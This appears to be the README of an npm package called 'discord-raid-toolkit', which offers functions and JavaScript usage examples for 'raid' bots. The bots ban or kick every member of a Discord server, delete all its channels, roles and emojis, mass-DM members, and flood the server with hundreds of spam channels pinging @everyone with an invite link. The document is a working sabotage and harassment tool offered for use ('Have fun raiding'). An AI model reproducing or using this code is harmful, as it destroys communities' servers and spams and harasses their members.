Discord RAID Toolkit, There is finally one!

*This package is for people who want to make a really op* **raid** *bot in a couple of minutes*


<h1>Functions:</h1>

- `banall(serverid, ban_reason, client_name, event)` - This will allow you to ban every member that is on the guild with the id you provided.
- `kickall(serverid, kick_reason, client_name, event)` - This will allow you to kick every member that is on the guild with the id you provided.
- `deleteAllChannels(serverid, client_name, event)` - This will delete every channel on the guild with the ID you provided
- `createChannelsLoop(serverid, channels_name, times_messsage_is_sent, channel_message, topic, nsfw, channel_cooldown, reason, times, client_name, event)` - This is the whole **raid** practically... It allows you to make a loop for creating channels with really nice options to put in the created channels (the channel_cooldown must be put as seconds, so if you put 10, it will set 10 seconds of cooldown. etc... so if you want a bigger number then google '5 hours to seconds' or '6 hours to seconds' etc..)
- `dmall(serverid, dmall_message, client_name, event)` - It allows you to dm a dmall_message to every member in the guild with the ID you provided
- `deleteAllRoles(serverid, client_name, event)` - It allows you to delete every single role of the guild with the ID you provided
- `deleteAllEmojis(serverid, client_name event)` - It allows you to delete every single emoji of the guild with the ID you provided


<h1>Examples of every function</h1>

**How to ban every member in a guild:** (*banall(serverid, ban_reason, client_name, event)*)
```js
const raid = require('discord-raid-toolkit')
client.on('message', message => {
  if(message.content.startsWith('!banall')) {
    raid.banall(message.guild.id, 'YOU JUST GOT F#CKED BY IDK!', client, message) //this will ban every single member in current guild setting the reason of their ban as 'YOU JUST GOT F#CKED BY IDK!'
  }
})
```


**How to kick every member in a guild:** (*kickall(serverid, kick_reason, client_name, event)*)
```js
const raid = require('discord-raid-toolkit')
client.on('message', message => {
  if(message.content.startsWith('!kickall')) {
    raid.kickall(message.guild.id, 'KICK REASON IN HERE BRUH!', client, message) //this will kick every single member in current guild setting the reason of their kick as 'KICK REASON IN HERE BRUH!'
  }
})
```

**How to delete every channel in a guild:** (*deleteAllChannels(serverid, client_name, event)*)
```js
const raid = require('discord-raid-toolkit')
client.on('message', message => {
  if(message.content.startsWith('!delete-all-channels')) {
    raid.deleteAllChannels(message.guild.id, client, message) //This will delete every single channel in current guild
  }
})
```

**How to create a loop to make 254 (or any if you want this amount is for the example) channels in a guild:** (*createChannelsLoop(serverid, channels_name, times_messsage_is_sent, channel_message, topic, nsfw, channel_cooldown, reason, times, client_name, event)*)
```js
client.on('message', message => {
  if(message.content.startsWith('!create-254-channels')) {
    raid.createChannelsLoop(message.guild.id, 'server f#cked by myself!', '5', '@everyone https://discord.gg/some-invite-code-bruh', 'LMAO! CHANNEL TOPIC!', true, 10, 'They deserved it...', 254, client, message) //the times_message_is_sent field sets the times the channel_message will be sent to created channels, You can always try in a test server and understand much better, nsfw can be either 'true' or 'false', channel_cooldown field is the cooldown for the channels created, it must be put in seconds, so google 6 hours to seconds or 1 hour to second and the convert to seconds is the number you must put (as you see i put 10 in the example so cooldown will be 10 seconds), the reason field is the reason that will be shown up on audit logs when creating any channel, and times is just the times the channels will be created, in the example i put 254 so it will make 254 channels, so there you go!
  }
})
```

**How to dm a message to every member in a guild:** (*dmall(serverid, dmall_message, client_name, event)*)
```js
const raid = require('discord-raid-toolkit')
client.on('message', message => {
  if(message.content.startsWith('!dmall')) {
    raid.dmall(message.guild.id, 'hello bruh' client, message) //this will send the text 'hello bruh' to every member in current guild
  }
})
```

**How to delete every single role in a guild:** (*deleteAllRoles(serverid, client_name, event)*)
```js
const raid = require('discord-raid-toolkit')
client.on('message', message => {
  if(message.content.startsWith('!delete-all-roles')) {
    raid.deleteAllRoles(message.guild.id, client, message) //this will delete every single role in current guild
  }
})
```

**How to delete every single emoji in a guild:** (*deleteAllEmojis(serverid, client_name event)*)
```js
const raid = require('discord-raid-toolkit')
client.on('message', message => {
  if(message.content.startsWith('!delete-all-emojis')) {
    raid.deleteAllEmojis(message.guild.id, client, message) //this will delete every single emoji in current guild
  }
})
```



**After this you are done! i think i explained correctly so that anyone can get it! Have fun raiding.**



UPDATE (0.0.9)
- Now your bot won't spam the console when reaching 500 channels created! The loop will stop when there are more than 498 channels.

UPDATE (0.0.10)
- Removed "type" field in **createChannelsLoop()**

UPDATE(0.0.11)
- Updated README to match with 0.0.10 update

UPDATE (0.2.0)
- Improved package core

